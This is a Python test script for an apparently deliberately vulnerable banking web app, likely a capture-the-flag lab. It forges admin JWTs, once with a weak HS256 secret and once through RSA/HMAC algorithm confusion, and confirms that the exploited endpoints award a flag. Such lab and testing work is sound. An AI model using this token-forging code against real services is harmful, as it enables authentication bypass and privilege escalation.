import json
import base64
import hmac
import hashlib
import jwt
import app as bank_app

def test_jwt_verification():
    print("=== TEST 1: Unconditional Endpoints Response Check ===")
    client = bank_app.app.test_client()
    
    # Authenticate user session
    with client.session_transaction() as sess:
        sess['user_id'] = 1
        sess['username'] = 'testuser'
        sess['role'] = 'user'
        sess['intern_id'] = 'INT-TEST1234'
        
    # 1. GET /token
    res1 = client.get('/token')
    data1 = json.loads(res1.data.decode())
    print("GET /token Raw Response:")
    print(json.dumps(data1, indent=2))
    assert 'flag' not in data1, "ERROR: flag leaked on /token!"
    assert 'hint' not in data1, "ERROR: hint leaked on /token!"
    print("-> CONFIRMED: No flag or hint leaked on GET /token.\n")
    
    # 2. GET /api/secure-token
    res2 = client.get('/api/secure-token')
    data2 = json.loads(res2.data.decode())
    print("GET /api/secure-token Raw Response:")
    print(json.dumps(data2, indent=2))
    assert 'flag' not in data2, "ERROR: flag leaked on /api/secure-token!"
    assert 'hint' not in data2, "ERROR: hint leaked on /api/secure-token!"
    print("-> CONFIRMED: No flag or hint leaked on GET /api/secure-token.\n")
    
    print("=== TEST 2: Exploited Verification Endpoints Check ===")
    
    # 3. POST /verify-token with forged admin HS256 token ("weak_secret")
    forged_weak_token = jwt.encode({'username': 'testuser', 'role': 'admin'}, 'weak_secret', algorithm='HS256')
    if isinstance(forged_weak_token, bytes):
        forged_weak_token = forged_weak_token.decode()
        
    res3 = client.post('/verify-token', json={'token': forged_weak_token})
    data3 = json.loads(res3.data.decode())
    print("POST /verify-token (Forged HS256 Admin Token) Raw Response:")
    print(json.dumps(data3, indent=2))
    assert 'flag' in data3, "ERROR: flag not awarded on /verify-token exploit!"
    print("-> CONFIRMED: Flag successfully awarded on /verify-token upon exploit.\n")
    
    # 4. POST /api/verify-secure-token with algorithm confusion (HS256 signed with RSA public key)
    with open('keys/public_key.pem', 'r') as f:
        pub_key = f.read()
    
    header = {'alg': 'HS256', 'typ': 'JWT'}
    payload = {'user_id': 1, 'username': 'testuser', 'role': 'admin'}
    
    b64_header = base64.urlsafe_b64encode(json.dumps(header).encode()).decode().rstrip('=')
    b64_payload = base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip('=')
    
    signing_input = f"{b64_header}.{b64_payload}".encode()
    signature = hmac.new(pub_key.encode(), signing_input, hashlib.sha256).digest()
    b64_sig = base64.urlsafe_b64encode(signature).decode().rstrip('=')
    
    forged_confusion_token = f"{b64_header}.{b64_payload}.{b64_sig}"
        
    res4 = client.post('/api/verify-secure-token', json={'token': forged_confusion_token})
    data4 = json.loads(res4.data.decode())
    print("POST /api/verify-secure-token (Algorithm Confusion Forged Admin Token) Raw Response:")
    print(json.dumps(data4, indent=2))
    assert 'flag' in data4, "ERROR: flag not awarded on /api/verify-secure-token exploit!"
    print("-> CONFIRMED: Flag successfully awarded on /api/verify-secure-token upon exploit.\n")

if __name__ == '__main__':
    test_jwt_verification()
